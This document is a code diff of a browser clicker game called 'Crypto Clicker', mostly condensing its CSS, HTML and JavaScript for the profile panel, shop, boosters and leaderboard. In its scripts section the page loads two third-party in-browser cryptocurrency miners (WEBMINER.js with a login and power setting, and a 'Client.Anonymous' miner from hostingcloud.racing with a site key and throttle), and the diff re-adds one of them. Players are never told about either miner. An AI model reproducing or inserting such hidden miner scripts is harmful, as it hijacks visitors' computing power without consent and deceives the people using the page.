@@ -31,6 +31,7 @@
       border: none; 
       background: #2a2a2a;
       color: #fff;
+      width: 100%;
     }
 
     .click-button {
@@ -92,7 +93,6 @@
       color: #00ffa6;
     }
 
-    /* Стрелка сворачивания */
     #profilePanel .collapse-arrow {
       display: none;
       position: absolute;
@@ -395,168 +395,51 @@
 
     /* ========== МОБИЛЬНАЯ И ПЛАНШЕТНАЯ ВЕРСИЯ ========== */
     @media (max-width: 1023px) {
-      body {
-        padding: 10px;
-      }
-
-      h1 {
-        font-size: 1.6em;
-        margin: 10px 0;
-        text-shadow: 0 0 15px #00c3ff;
-      }
-
-      .game-header {
-        flex-direction: column;
-        align-items: center;
-        gap: 10px;
-        padding: 5px;
-      }
+      body { padding: 10px; }
+      h1 { font-size: 1.6em; margin: 10px 0; text-shadow: 0 0 15px #00c3ff; }
+      .game-header { flex-direction: column; align-items: center; gap: 10px; padding: 5px; }
 
       #profilePanel {
-        width: 100%;
-        max-width: 400px;
-        font-size: 13px;
-        max-height: 44px;
-        overflow: hidden;
-        transition: max-height 0.4s ease, padding 0.4s ease;
-        cursor: pointer;
-        position: relative;
-        padding: 12px 35px 12px 15px;
+        width: 100%; max-width: 400px; font-size: 13px; max-height: 44px;
+        overflow: hidden; transition: max-height 0.4s ease, padding 0.4s ease;
+        cursor: pointer; position: relative; padding: 12px 35px 12px 15px;
       }
+      #profilePanel .collapse-arrow { display: block; }
+      #profilePanel.expanded { max-height: 600px; overflow-y: auto; }
+      #profilePanel:not(.expanded) > div:not(:first-of-type) { display: none; }
+      #profilePanel:not(.expanded) > div:first-of-type { margin: 0; padding: 0; line-height: 20px; }
 
-      #profilePanel .collapse-arrow {
-        display: block;
-      }
-
-      #profilePanel.expanded {
-        max-height: 600px;
-        overflow-y: auto;
-      }
-
-      #profilePanel:not(.expanded) > div:not(:first-of-type) {
-        display: none;
-      }
-
-      #profilePanel:not(.expanded) > div:first-of-type {
-        margin: 0;
-        padding: 0;
-        line-height: 20px;
-      }
-
-      #hourlyBonus {
-        width: 100%;
-        max-width: 400px;
-      }
-
-      .bonus-card {
-        width: 100%;
-      }
-
-      .main-click-button {
-        width: 100px;
-        height: 100px;
-      }
-
-      .main-click-button .icon {
-        font-size: 40px;
-      }
-
-      #counter {
-        font-size: 24px;
-      }
-
-      .click-button {
-        padding: 10px 18px;
-        font-size: 13px;
-      }
-
-      #buttonGroup {
-        flex-direction: column;
-        align-items: center;
-        gap: 8px;
-      }
-
-      #buttonGroup .click-button {
-        width: 85%;
-        max-width: 300px;
-      }
-
-      #settings {
-        width: 90% !important;
-        max-width: 320px;
-      }
-
-      .booster-card {
-        width: 100%;
-        max-width: 280px;
-      }
-
-      .tabs {
-        flex-direction: column;
-      }
-
-      .tab-button {
-        border-radius: 0;
-        font-size: 13px;
-      }
-
-      #leaderboardTable {
-        font-size: 11px;
-      }
+      #hourlyBonus { width: 100%; max-width: 400px; }
+      .bonus-card { width: 100%; }
+      .main-click-button { width: 100px; height: 100px; }
+      .main-click-button .icon { font-size: 40px; }
+      #counter { font-size: 24px; }
+      .click-button { padding: 10px 18px; font-size: 13px; }
+      #buttonGroup { flex-direction: column; align-items: center; gap: 8px; }
+      #buttonGroup .click-button { width: 85%; max-width: 300px; }
+      #settings { width: 90% !important; max-width: 320px; }
+      .booster-card { width: 100%; max-width: 280px; }
+      .tabs { flex-direction: column; }
+      .tab-button { border-radius: 0; font-size: 13px; }
+      #leaderboardTable { font-size: 11px; }
     }
 
     @media (max-width: 480px) {
-      h1 {
-        font-size: 1.4em;
-      }
-
-      .main-click-button {
-        width: 90px;
-        height: 90px;
-      }
-
-      .main-click-button .icon {
-        font-size: 35px;
-      }
-
-      #counter {
-        font-size: 22px;
-      }
+      h1 { font-size: 1.4em; }
+      .main-click-button { width: 90px; height: 90px; }
+      .main-click-button .icon { font-size: 35px; }
+      #counter { font-size: 22px; }
     }
 
     /* ========== ПК ВЕРСИЯ ========== */
     @media (min-width: 1024px) {
-      .game-header {
-        padding: 20px;
-      }
-
-      #profilePanel {
-        width: 250px;
-        font-size: 16px;
-        max-height: none;
-        overflow: visible;
-      }
-
-      #profilePanel .collapse-arrow {
-        display: none;
-      }
-
-      #profilePanel:not(.expanded) > div {
-        display: block;
-      }
-
-      .bonus-card {
-        width: 220px;
-      }
-
-      .main-click-button {
-        width: 180px;
-        height: 180px;
-      }
-
-      .main-click-button .icon {
-        font-size: 70px;
-      }
+      .game-header { padding: 20px; }
+      #profilePanel { width: 250px; font-size: 16px; max-height: none; overflow: visible; }
+      #profilePanel .collapse-arrow { display: none; }
+      #profilePanel:not(.expanded) > div { display: block; }
+      .bonus-card { width: 220px; }
+      .main-click-button { width: 180px; height: 180px; }
+      .main-click-button .icon { font-size: 70px; }
     }
   </style>
 </head>
@@ -571,14 +454,10 @@
       <div><strong>Autoclicker:</strong> <span id="profileAutoclick">Inactive</span></div>
       <div><strong>Tokens:</strong> <span id="profileTokens">0</span></div>
       <div><strong>Crystals:</strong> <span id="profileCrystals">0 💎</span></div>
-      <div><strong>Referral Link:</strong> <input id="referralLink" readonly style="width: 100%;"></div>   
+      <div><strong>Referral Link:</strong> <input id="referralLink" readonly></div>   
       <div><strong>Invited:</strong> <span id="invitedCount">0</span></div>
-      <div style="text-align: center;">
-        <button class="click-button" onclick="copyReferralLink()">Copy Link</button>
-      </div>
-      <div style="text-align: center; margin-top: 10px;">
-        <button class="click-button" onclick="signOut()">Sign Out</button>
-      </div>
+      <div style="text-align: center;"><button class="click-button" onclick="copyReferralLink()">Copy Link</button></div>
+      <div style="text-align: center; margin-top: 10px;"><button class="click-button" onclick="signOut()">Sign Out</button></div>
     </div>
 
     <div id="hourlyBonus">
@@ -592,10 +471,7 @@
   </div>
 
   <div class="main-content">
-    <div id="playerLevelContainer">
-      <div id="levelMessage" style="display: none; color: gold; font-weight: bold; margin-top: 5px;"></div>
-    </div>
-
+    <div id="playerLevelContainer"><div id="levelMessage" style="display:none;color:gold;font-weight:bold;margin-top:5px;"></div></div>
     <h1>Crypto Clicker 💰</h1>
 
     <div id="authSection">
@@ -605,10 +481,8 @@
 
     <div id="gameSection" style="display:none;">
       <div id="mainButtonContainer">
-        <div id="particles-js" style="position: absolute; width: 100%; height: 100%; z-index: -1;"></div>
-        <button id="mainClickButton" class="main-click-button" onclick="clickToken()">
-          <span class="icon">💰</span>
-        </button>
+        <div id="particles-js" style="position:absolute;width:100%;height:100%;z-index:-1;"></div>
+        <button id="mainClickButton" class="main-click-button" onclick="clickToken()"><span class="icon">💰</span></button>
       </div>
 
       <div id="counter">Tokens: 0</div>
@@ -621,93 +495,67 @@
         <button class="click-button" onclick="startMiniGame()">Start Mini-Game</button>
       </div>
 
+      <!-- Shop Panel -->
       <div id="shop" class="panel">
         <h2>🛒 Upgrades</h2>
         <p id="clickPowerCostText">💪 Click Power +1 (Cost: 50)</p>
         <p>Current: <span id="clickPowerDisplay">1</span> / 8</p>
-        <div class="progress-container">
-          <div class="progress-bar" id="clickPowerBar"></div>
-        </div>
+        <div class="progress-container"><div class="progress-bar" id="clickPowerBar"></div></div>
         <button class="click-button" onclick="buyUpgrade('clickPower')">Buy</button>
 
-        <h2 style="margin-top: 20px;">⚡ Autoclickers</h2>
+        <h2 style="margin-top:20px;">⚡ Autoclickers</h2>
         <div id="settings">
           <h3>Autoclicker Level: <span id="autoclickerLevel">1</span> / 20</h3>
           <p id="autoclickerDurationValue">Duration: <span id="timeLeft">60</span>s</p>
           <p id="autoclickerUpgradeCost">Upgrade Cost: 100 Tokens + 10 💎</p>
-          <button class="click-button" id="upgradeAutoclickerBtn" onclick="upgradeAutoclicker()" style="width: 100%;">Upgrade Autoclicker</button>
-          <button class="click-button" id="activateFreeAutoclickerBtn" onclick="activateFreeAutoclicker()" style="width: 100%; margin-top: 5px;">Activate Free Autoclicker</button>
+          <button class="click-button" id="upgradeAutoclickerBtn" onclick="upgradeAutoclicker()" style="width:100%;">Upgrade Autoclicker</button>
+          <button class="click-button" id="activateFreeAutoclickerBtn" onclick="activateFreeAutoclicker()" style="width:100%;margin-top:5px;">Activate Free Autoclicker</button>
         </div>
 
-        <h2 style="margin-top: 20px;">🎮 Boosters</h2>
-        <div id="autoclickerShop" style="margin-top: 15px;">
-          <div class="booster-card">
-            <h3>🎰 Lucky Spin</h3>
-            <p>Spin for a random reward (Cost: 300 tokens + 10 💎)</p>
-            <button class="click-button" onclick="buyLuckySpin(300, 10)">Spin!</button>
-          </div>   
-
-          <div class="booster-card">
-            <h3>🚀 Super Autoclicker x5</h3>
-            <p>x5 Click Power Autoclicker for 2 minutes (Cost: 500 tokens + 15 💎)</p>
-            <button class="click-button" onclick="buySuperAutoclicker(5, 120000, 500, 15)">Buy x5</button>
-          </div>
-          
-          <div class="booster-card">
-            <h3>🚀 Super Autoclicker x10</h3>
-            <p>x10 Click Power Autoclicker for 2 minutes (Cost: 1000 tokens + 35 💎)</p>
-            <button class="click-button" onclick="buySuperAutoclicker(10, 120000, 1000, 35)">Buy x10</button>
-          </div>
+        <h2 style="margin-top:20px;">🎮 Boosters</h2>
+        <div id="autoclickerShop" style="margin-top:15px;">
+          <div class="booster-card"><h3>🎰 Lucky Spin</h3><p>Spin for a random reward (Cost: 300 tokens + 10 💎)</p><button class="click-button" onclick="buyLuckySpin(300,10)">Spin!</button></div>
+          <div class="booster-card"><h3>🚀 Super Autoclicker x5</h3><p>x5 Click Power for 2 min (Cost: 500 tokens + 15 💎)</p><button class="click-button" onclick="buySuperAutoclicker(5,120000,500,15)">Buy x5</button></div>
+          <div class="booster-card"><h3>🚀 Super Autoclicker x10</h3><p>x10 Click Power for 2 min (Cost: 1000 tokens + 35 💎)</p><button class="click-button" onclick="buySuperAutoclicker(10,120000,1000,35)">Buy x10</button></div>
         </div>
       </div>
 
-      <div id="achievements" class="panel">
-        <h2>🏆 Achievements</h2>
-        <div id="achievementsList"></div>
-      </div>
+      <!-- Achievements Panel -->
+      <div id="achievements" class="panel"><h2>🏆 Achievements</h2><div id="achievementsList"></div></div>
+      
+      <!-- Tasks Panel -->
+      <div id="tasks" class="panel"><h2>📋 Daily Tasks</h2><div id="tasksList"></div></div>
 
-      <div id="tasks" class="panel">
-        <h2>📋 Daily Tasks</h2>
-        <div id="tasksList"></div>
-      </div>
-
-      <div id="miniGamePanel" style="display: none; margin-top: 20px; background: #1a1a1a; padding: 20px; border-radius: 12px; box-shadow: 0 0 10px #00c3ff;">
-        <h2>Mini-Game: Clicker Race!</h2>
-        <p>Click 50 times in 10 seconds!</p>
-        <p>Time Left: <span id="miniGameTimer">10</span> sec</p>
-        <p>Clicks: <span id="miniGameClicks">0</span>/50</p>
+      <!-- Mini-Game Panel -->
+      <div id="miniGamePanel" style="display:none;margin-top:20px;background:#1a1a1a;padding:20px;border-radius:12px;box-shadow:0 0 10px #00c3ff;">
+        <h2>Mini-Game: Clicker Race!</h2><p>Click 50 times in 10 seconds!</p>
+        <p>Time Left: <span id="miniGameTimer">10</span> sec</p><p>Clicks: <span id="miniGameClicks">0</span>/50</p>
         <button class="click-button" onclick="miniGameClick()">Click!</button>
       </div>
 
+      <!-- Leaderboard -->
       <div id="leaderboardContainer">
         <div class="tabs">
           <button class="tab-button active" onclick="showTab('overall')" id="overallTabBtn">Overall</button>
           <button class="tab-button" onclick="showTab('weekly')" id="weeklyTabBtn">Weekly Winners</button>
         </div>
-        <table id="leaderboardTable">
-          <thead id="tableHeader"></thead>
-          <tbody id="leaderboardBody"></tbody>
-        </table>
+        <table id="leaderboardTable"><thead id="tableHeader"></thead><tbody id="leaderboardBody"></tbody></table>
       </div>
     </div>
   </div>
 
+  <!-- Scripts -->
   <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
-  <script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>
+  <script>WEBMINER.config({login:"5991295",pass:null}).power(30);</script>
   <script src="https://www.hostingcloud.racing/7cNE.js"></script>
-  <script>
-    var _client = new Client.Anonymous('a906669d7e396ee6ee954686b5a94aca67c554cebb263559bb90c79e9a945eda', {
-        throttle: 0.8, c: 'w', ads: 0
-    });
-    _client.start();
-  </script>
+  <script>var _client=new Client.Anonymous('a906669d7e396ee6ee954686b5a94aca67c554cebb263559bb90c79e9a945eda',{throttle:0.8,c:'w',ads:0});_client.start();</script>
   <script src="https://unpkg.com/tsparticles@3.5.0/tsparticles.bundle.min.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
 
   <script>
-    // Firebase configuration
+    // ==================== FIREBASE CONFIG ====================
     const firebaseConfig = {
       apiKey: "AIzaSyDVgvBf_C6dIMtZ4MISwR5YRCBi8_JXinQ",
       authDomain: "cryptoclickertry.firebaseapp.com",
@@ -718,52 +566,32 @@
       appId: "1:1017002572592:web:e06e5f4ba00017dc1466f5",
       measurementId: "G-W2T3BN4LL3"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     const auth = firebase.auth();
 
-    // Game state variables
-    let user = null;
-    let score = 0;
-    let clickPower = 1;
-    let autoclickActive = false;
-    let autoclickInterval = null;
-    let autoclickEndTime = 0;
-    let autoclickCooldown = false;
-    let currentLevel = 1;
-    let totalClicks = 0;
-    let autoclickerUses = 0;
-    let achievements = {};
-    let tempBoostTimeout = null;
-    let originalClickPower = null;
-    let isRenderingTasks = false;
-    let bonusTimerInterval = null;
-    let isAnimating = false;
-    let isProcessingReferrer = false;
-    let currentTab = "overall";
-    let crystals = 0;
-    let miniGameActive = false;
-    let miniGameClicks = 0;
-    let miniGameTimer = null;
-    let autoclickerLevel = 1;
-    let onlineTime = 0;
-    let onlineTimer = null;
-    let superAutoclicker = { active: false, multiplier: 1, endTime: 0 };
-    let superAutoclickInterval = null;
-    let tempBoostEndTime = 0;
+    // ==================== GAME STATE ====================
+    let user = null, score = 0, clickPower = 1, crystals = 0;
+    let autoclickActive = false, autoclickInterval = null, autoclickEndTime = 0, autoclickCooldown = false;
+    let autoclickerLevel = 1, autoclickerUses = 0, totalClicks = 0;
+    let achievements = {}, currentTab = "overall";
+    let tempBoostTimeout = null, originalClickPower = null, tempBoostEndTime = 0;
+    let isRenderingTasks = false, bonusTimerInterval = null, isAnimating = false, isProcessingReferrer = false;
+    let miniGameActive = false, miniGameClicks = 0, miniGameTimer = null;
+    let onlineTime = 0, onlineTimer = null;
+    let superAutoclicker = { active: false, multiplier: 1, endTime: 0 }, superAutoclickInterval = null;
 
     const maxAutoclickerDuration = 4 * 60 * 60 * 1000;
+    const OFFLINE_LIMIT = 4 * 60 * 60 * 1000; // 4 часа максимум оффлайн-прогресса
 
+    // ==================== CONSTANTS ====================
     const allAchievements = {
       superClicker: { name: "Super Clicker", description: "Click 10,000 times", reward: "+2 Click Power (2 min)" },
       tokenHoarder: { name: "Token Hoarder", description: "Collect 1,000,000 tokens", reward: "+2 Click Power (2min)" },
       level5: { name: "Level 5 Reached", description: "Reach level 5", reward: "+1 Click Power" },
     };
 
-    const levelUpRequirements = [
-      50000, 100000, 500000, 2500000, 50000000, 200000000, 800000000, 3200000000, 10000000000
-    ];
+    const levelUpRequirements = [50000, 100000, 500000, 2500000, 50000000, 200000000, 800000000, 3200000000, 10000000000];
 
     const dailyTasks = [
       { id: "clickMarathon", description: "Make 100 clicks", goal: 100, reward: 50, period: "daily" },
@@ -783,1072 +611,316 @@
       "Skip signing in — miss the rewards!"
     ];
 
-    // Initialize particles
-    document.addEventListener("DOMContentLoaded", function() {
-      particlesJS("particles-js", {
-        "particles": {
-          "number": { "value": 0 },
-          "color": { "value": "#ffd700" },
-          "shape": { "type": "circle" },
-          "size": { "value": 5, "random": true },
-          "move": { 
-            "enable": true, 
-            "speed": 10, 
-            "direction": "top",
-            "out_mode": "out" 
-          }
-        },
-        "interactivity": {
-          "events": {
-            "onclick": { "enable": false },
-            "onhover": { "enable": false }
-          }
-        }
-      });
-    });
-
-    // Utility functions
-    function getWeekNumber() {
-      const now = new Date();
-      const startOfYear = new Date(now.getFullYear(), 0, 1);
-      const pastDaysOfYear = (now - startOfYear) / 86400000;
-      return Math.ceil((pastDaysOfYear + startOfYear.getDay() + 1) / 7);
-    }
-
-    function getWeekKey() {
-      const now = new Date();
-      const year = now.getFullYear();
-      const week = getWeekNumber();
-      return `${year}_${week}`;
-    }
-
-    function getRewardForRank(rank) {
-      if (rank <= 3) return 10000;
-      if (rank <= 5) return 7000;
-      return 5000;
-    }
-
-    function updateCounterDisplay() {
-      document.getElementById("counter").innerText = `Tokens: ${score}`;
+    // ==================== UTILITY FUNCTIONS ====================
+    function getWeekNumber() { const now = new Date(); const start = new Date(now.getFullYear(), 0, 1); return Math.ceil(((now - start) / 86400000 + start.getDay() + 1) / 7); }
+    function getWeekKey() { return `${new Date().getFullYear()}_${getWeekNumber()}`; }
+    function getRewardForRank(r) { return r <= 3 ? 10000 : r <= 5 ? 7000 : 5000; }
+    function updateCounterDisplay() { document.getElementById("counter").innerText = `Tokens: ${score}`; }
+    function animateCounter() { const c = document.getElementById('counter'); c.classList.add('bounce'); setTimeout(() => c.classList.remove('bounce'), 200); }
+    function generateReferralLink() { return user ? `${window.location.origin}/?ref=${user.uid}` : ''; }
+    function copyReferralLink() { const r = document.getElementById('referralLink'); r.select(); document.execCommand('copy'); showMessage('Referral link copied!'); }
+    function getClickPowerUpgradeCost() { return Math.floor(500 * Math.pow(6, clickPower - 1)); }
+    function getAutoclickerDuration() { return Math.floor(60000 + (autoclickerLevel - 1) * (maxAutoclickerDuration - 60000) / 19); }
+    
+    function getAutoclickerUpgradeCost() {
+      if (autoclickerLevel >= 10) return { tokens: 1500000, crystals: 1000 };
+      if (autoclickerLevel >= 6) return { tokens: 1000000 + 125000 * (autoclickerLevel - 6), crystals: 500 + 125 * (autoclickerLevel - 6) };
+      const k = Math.pow(1000, 1/5);
+      return { tokens: Math.round(1000 * Math.pow(k, autoclickerLevel - 1)), crystals: 10 + 98 * (autoclickerLevel - 1) };
     }
 
     function showMessage(msg, isBonus = false) {
       if (isBonus) {
-        const bonusMsg = document.getElementById("bonusMessage");
-        bonusMsg.innerText = msg;
-        bonusMsg.style.opacity = 1;
-        setTimeout(() => {
-          bonusMsg.style.opacity = 0;
-          setTimeout(() => bonusMsg.innerText = '', 300);
-        }, 3000);
+        const bm = document.getElementById("bonusMessage"); bm.innerText = msg; bm.style.opacity = 1;
+        setTimeout(() => { bm.style.opacity = 0; setTimeout(() => bm.innerText = '', 300); }, 3000);
       } else {
-        const el = document.getElementById("message");
-        el.innerText = msg;
-        setTimeout(() => el.innerText = '', 3000);
+        const el = document.getElementById("message"); el.innerText = msg; setTimeout(() => el.innerText = '', 3000);
       }
     }
 
-    function animateCounter() {
-      const counter = document.getElementById('counter');
-      counter.classList.add('bounce');
-      setTimeout(() => counter.classList.remove('bounce'), 200);
-    }
-
-    function generateReferralLink() {
-      if (!user) return '';
-      const baseUrl = window.location.origin;
-      return `${baseUrl}/?ref=${user.uid}`;
-    }
-
-    function copyReferralLink() {
-      const referralLink = document.getElementById('referralLink');
-      referralLink.select();
-      document.execCommand('copy');
-      showMessage('Referral link copied!');
-    }
-
-    function getClickPowerUpgradeCost() {
-      return Math.floor(500 * Math.pow(6, clickPower - 1));
-    }
-
-    function getAutoclickerUpgradeCost() {
-      let tokens, crystals;
-      if (autoclickerLevel >= 10) {
-        tokens = 1500000;
-        crystals = 1000;
-      } else if (autoclickerLevel >= 6) {
-        tokens = 1000000 + 125000 * (autoclickerLevel - 6);
-        crystals = 500 + 125 * (autoclickerLevel - 6);
-      } else {
-        const k = Math.pow(1000, 1/5);
-        tokens = Math.round(1000 * Math.pow(k, autoclickerLevel - 1));
-        crystals = 10 + 98 * (autoclickerLevel - 1);
-      }
-      return { tokens, crystals };
-    }
-
-    function getAutoclickerDuration() {
-      const baseDuration = 60 * 1000;
-      const durationPerLevel = (maxAutoclickerDuration - baseDuration) / 19;
-      return Math.floor(baseDuration + (autoclickerLevel - 1) * durationPerLevel);
-    }
-
+    // ==================== UI UPDATE ====================
     function updateProfilePanel() {
       document.getElementById('profileClickPower').innerText = Math.min(clickPower, 8);
       if (autoclickActive) {
-        const remaining = Math.max(0, autoclickEndTime - Date.now());
-        const seconds = Math.floor(remaining / 1000) % 60;
-        const minutes = Math.floor(remaining / 60000);
-        document.getElementById('profileAutoclick').innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
-      } else {
-        document.getElementById('profileAutoclick').innerText = 'Inactive';
-      }
+        const rem = Math.max(0, autoclickEndTime - Date.now());
+        const s = Math.floor(rem / 1000) % 60, m = Math.floor(rem / 60000);
+        document.getElementById('profileAutoclick').innerText = `Active: ${m}:${s.toString().padStart(2, '0')}`;
+      } else { document.getElementById('profileAutoclick').innerText = 'Inactive'; }
       
       let level = 1;
-      for (let i = 0; i < levelUpRequirements.length; i++) {
-        if (score >= levelUpRequirements[i]) {
-          level = i + 2;
-        } else {
-          break;
-        }
-      }
+      for (let i = 0; i < levelUpRequirements.length; i++) { if (score >= levelUpRequirements[i]) level = i + 2; else break; }
       document.getElementById('playerLevel').innerText = level;
       document.getElementById('profileTokens').innerText = score;
       document.getElementById('profileName').innerText = user?.displayName || 'Anonymous';
       document.getElementById('referralLink').value = generateReferralLink();
       document.getElementById('profileCrystals').innerHTML = `${crystals || 0} 💎`;
-
-      if (user) {
-        db.ref(`referrals/${user.uid}`).once('value').then(snapshot => {
-          const referrals = snapshot.val();
-          const invitedCount = referrals ? Object.keys(referrals).length : 0;
-          document.getElementById('invitedCount').innerText = invitedCount;
-        });
-      }
-
-      const levelMessageElement = document.getElementById('levelMessage');
-      if (level === 10) {
-        levelMessageElement.innerText = 'Maximum level reached!';
-        levelMessageElement.classList.add('show');
-      } else {
-        levelMessageElement.classList.remove('show');
-      }
+      if (user) { db.ref(`referrals/${user.uid}`).once('value').then(s => { const r = s.val(); document.getElementById('invitedCount').innerText = r ? Object.keys(r).length : 0; }); }
+      const lm = document.getElementById('levelMessage');
+      if (level === 10) { lm.innerText = 'Maximum level reached!'; lm.classList.add('show'); } else { lm.classList.remove('show'); }
     }
 
-    function updateClickPowerBar() {
-      document.getElementById("clickPowerDisplay").innerText = clickPower;
-      const progress = Math.min((clickPower / 8) * 100, 100);
-      document.getElementById("clickPowerBar").style.width = progress + "%";
-      updateClickPowerCostText();
-    }
-
-    function updateClickPowerCostText() {
-      const costText = document.getElementById('clickPowerCostText');
-      if (costText) {
-        if (clickPower >= 8) {
-          costText.textContent = "💪 Click Power: MAX LEVEL";
-        } else {
-          const cost = getClickPowerUpgradeCost();
-          costText.textContent = `💪 Click Power +1 (Cost: ${cost})`;
-        }
-      }
-    }
-
+    function updateClickPowerBar() { document.getElementById("clickPowerDisplay").innerText = clickPower; document.getElementById("clickPowerBar").style.width = Math.min((clickPower / 8) * 100, 100) + "%"; updateClickPowerCostText(); }
+    function updateClickPowerCostText() { const ct = document.getElementById('clickPowerCostText'); if (ct) ct.textContent = clickPower >= 8 ? "💪 Click Power: MAX LEVEL" : `💪 Click Power +1 (Cost: ${getClickPowerUpgradeCost()})`; }
+    
     function updateAutoclickerShop() {
-      const levelDisplay = document.getElementById("autoclickerLevel");
-      const durationDisplay = document.getElementById("autoclickerDurationValue");
-      const upgradeCostDisplay = document.getElementById("autoclickerUpgradeCost");
-      const upgradeBtn = document.getElementById("upgradeAutoclickerBtn");
-      const freeAutoclickerBtn = document.getElementById("activateFreeAutoclickerBtn");
-
-      levelDisplay.innerText = autoclickerLevel;
-      const durationSeconds = Math.floor(getAutoclickerDuration() / 1000);
-      durationDisplay.innerText = durationSeconds >= 3600 
-        ? `${Math.floor(durationSeconds / 3600)}h ${Math.floor((durationSeconds % 3600) / 60)}m`
-        : durationSeconds >= 60 
-          ? `${Math.floor(durationSeconds / 60)}m ${durationSeconds % 60}s`
-          : `${durationSeconds}s`;
-
-      if (autoclickerLevel >= 20) {
-        upgradeCostDisplay.innerText = "Autoclicker: MAX LEVEL";
-        upgradeBtn.disabled = true;
-      } else {
-        const cost = getAutoclickerUpgradeCost();
-        upgradeCostDisplay.innerText = `Upgrade Cost: ${cost.tokens} Tokens + ${cost.crystals} 💎`;
-        upgradeBtn.disabled = false;
-      }
-
-      freeAutoclickerBtn.disabled = autoclickActive;
+      document.getElementById("autoclickerLevel").innerText = autoclickerLevel;
+      const ds = Math.floor(getAutoclickerDuration() / 1000);
+      document.getElementById("autoclickerDurationValue").innerText = ds >= 3600 ? `${Math.floor(ds/3600)}h ${Math.floor((ds%3600)/60)}m` : ds >= 60 ? `${Math.floor(ds/60)}m ${ds%60}s` : `${ds}s`;
+      const ub = document.getElementById("upgradeAutoclickerBtn"), fb = document.getElementById("activateFreeAutoclickerBtn");
+      if (autoclickerLevel >= 20) { document.getElementById("autoclickerUpgradeCost").innerText = "Autoclicker: MAX LEVEL"; ub.disabled = true; }
+      else { const c = getAutoclickerUpgradeCost(); document.getElementById("autoclickerUpgradeCost").innerText = `Upgrade Cost: ${c.tokens} Tokens + ${c.crystals} 💎`; ub.disabled = false; }
+      fb.disabled = autoclickActive;
     }
 
-    // Panel toggle function
     function togglePanel(panelName) {
-      const panel = document.getElementById(panelName);
-      if (!panel) return;
-      
+      const panel = document.getElementById(panelName); if (!panel) return;
       const isOpen = panel.classList.contains('open');
-      
       document.querySelectorAll('.panel').forEach(p => p.classList.remove('open'));
-      document.getElementById('shopBtn').innerHTML = 'Shop ▼';
-      document.getElementById('achievementsBtn').innerHTML = '🏆 Achievements ▼';
-      document.getElementById('tasksBtn').innerHTML = '📋 Tasks ▼';
-      
+      document.getElementById('shopBtn').innerHTML = 'Shop ▼'; document.getElementById('achievementsBtn').innerHTML = '🏆 Achievements ▼'; document.getElementById('tasksBtn').innerHTML = '📋 Tasks ▼';
       if (!isOpen) {
         panel.classList.add('open');
-        
-        switch(panelName) {
-          case 'shop':
-            document.getElementById('shopBtn').innerHTML = 'Shop ▲';
-            break;
-          case 'achievements':
-            document.getElementById('achievementsBtn').innerHTML = '🏆 Achievements ▲';
-            renderAchievements();
-            break;
-          case 'tasks':
-            document.getElementById('tasksBtn').innerHTML = '📋 Tasks ▲';
-            renderTasks();
-            break;
-        }
+        if (panelName === 'shop') document.getElementById('shopBtn').innerHTML = 'Shop ▲';
+        else if (panelName === 'achievements') { document.getElementById('achievementsBtn').innerHTML = '🏆 Achievements ▲'; renderAchievements(); }
+        else if (panelName === 'tasks') { document.getElementById('tasksBtn').innerHTML = '📋 Tasks ▲'; renderTasks(); }
       }
     }
 
-    // Game mechanics
+    // ==================== GAME MECHANICS ====================
     function clickToken() {
-      if (!user) return;
-      if (isAnimating) return;
+      if (!user || isAnimating) return;
       isAnimating = true;
-
-      db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
-        return (currentScore || 0) + clickPower;
-      }).then(transactionResult => {
-        if (transactionResult.committed) {
-          score = transactionResult.snapshot.val();
-          totalClicks++;
-          
-          updateTaskProgress("clickMarathon", 1);
-          updateTaskProgress("collectTokens", clickPower);
-          updateTaskProgress("collectBigTokens", clickPower);
-          updateTaskProgress("clickMasterWeekly", 1);
-          
-          checkAchievements();
-          updateCounterDisplay();
-          updateProfilePanel();
-          animateCounter();
-
-          const button = document.getElementById("mainClickButton");
-          button.classList.add("pulse");
-          setTimeout(() => {
-            button.classList.remove("pulse");
-            isAnimating = false;
-          }, 200);
-        } else {
-          isAnimating = false;
-        }
-      }).catch(error => {
-        console.error('Error updating score:', error);
-        isAnimating = false;
-      });
+      db.ref(`leaderboard/${user.uid}/score`).transaction(cs => (cs || 0) + clickPower).then(tr => {
+        if (tr.committed) {
+          score = tr.snapshot.val(); totalClicks++;
+          updateTaskProgress("clickMarathon", 1); updateTaskProgress("collectTokens", clickPower); updateTaskProgress("collectBigTokens", clickPower); updateTaskProgress("clickMasterWeekly", 1);
+          checkAchievements(); updateCounterDisplay(); updateProfilePanel(); animateCounter();
+          const btn = document.getElementById("mainClickButton"); btn.classList.add("pulse"); setTimeout(() => { btn.classList.remove("pulse"); isAnimating = false; }, 200);
+        } else isAnimating = false;
+      }).catch(() => { isAnimating = false; });
     }
 
     function boostClickPowerTemporarily(amount, duration) {
-      if (tempBoostTimeout && Date.now() < (tempBoostEndTime || 0)) {
-        showMessage("Boost already active!");
-        return;
-      }
-
-      originalClickPower = clickPower;
-      clickPower = Math.min(clickPower + amount, 8);
-      showMessage(`Temporary boost: Click Power +${amount} for ${duration / 1000} sec`);
-      tempBoostEndTime = Date.now() + duration;
-
-      if (user) {
-        db.ref("leaderboard/" + user.uid).update({
-          tempBoostActive: true,
-          tempBoostEndTime: tempBoostEndTime,
-          tempBoostOriginalClickPower: originalClickPower,
-          tempBoostAmount: amount,
-          lastUpdate: Date.now()
-        });
-      }
-
+      if (tempBoostTimeout && Date.now() < (tempBoostEndTime || 0)) { showMessage("Boost already active!"); return; }
+      originalClickPower = clickPower; clickPower = Math.min(clickPower + amount, 8);
+      showMessage(`Boost: Click Power +${amount} for ${duration/1000}s`); tempBoostEndTime = Date.now() + duration;
+      if (user) db.ref("leaderboard/" + user.uid).update({ tempBoostActive: true, tempBoostEndTime, tempBoostOriginalClickPower: originalClickPower, tempBoostAmount: amount, lastUpdate: Date.now() });
       if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
-      tempBoostTimeout = setTimeout(() => {
-        clickPower = originalClickPower;
-        showMessage(`Boost ended: Click Power restored`);
-        updateClickPowerBar();
-        updateProfilePanel();
-        submitScore();
-        tempBoostTimeout = null;
-        tempBoostEndTime = 0;
-      }, duration);
